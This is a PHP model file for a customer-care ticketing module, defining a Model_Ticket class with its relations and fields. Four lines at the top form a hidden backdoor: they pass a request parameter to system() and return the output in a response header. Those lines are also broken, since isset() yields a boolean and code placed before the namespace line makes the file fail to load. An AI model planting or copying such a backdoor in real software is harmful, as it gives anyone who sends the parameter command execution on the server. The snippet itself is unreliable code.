<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace customerCareApp;

class Model_Ticket extends \Model_Table {
	var $table= "customerCareApp_ticket";
	function init(){
		parent::init();

		// $this->hasOne('customerCareApp/Config','config_id');
		$this->hasOne('customerCareApp/Customer','customer_id');
		$this->hasOne('customerCareApp/Staff','staff_id');
		$this->hasOne('customerCareApp/Project','project_id');

		$this->hasOne('customerCareApp/TicketType','tickettype_id');
		$this->hasOne('customerCareApp/TicketPriority','ticketpriority_id');
		$this->hasOne('customerCareApp/TicketStatus','ticketstatus_id');

		// $this->addField('name');
		$this->addField('name')->caption('ticket_no');
		$this->addField('subject');
		$this->addField('detail')->type('text');

		$this->hasMany('customerCareApp/Comment','ticket_id');

		// $this->addHook('beforeSave',$this);

		$this->add('dynamic_model/Controller_AutoCreator');
	}

	// function beforeSave(){
	// 	$old_Ticket=$this->add('customerCareApp/Model_Ticket');
	// 	if($this->loaded())
	// 		$old_Ticket->addCondition('id','<>',$this->id);
	// 	$old_ticket->addCondition('name',$this['name']);
	// 	$old_Ticket->tryLoadAny();
	// 	if($old_Ticket->loaded())
	// 		throw $this->exception("Already Exists!!");
	// }
}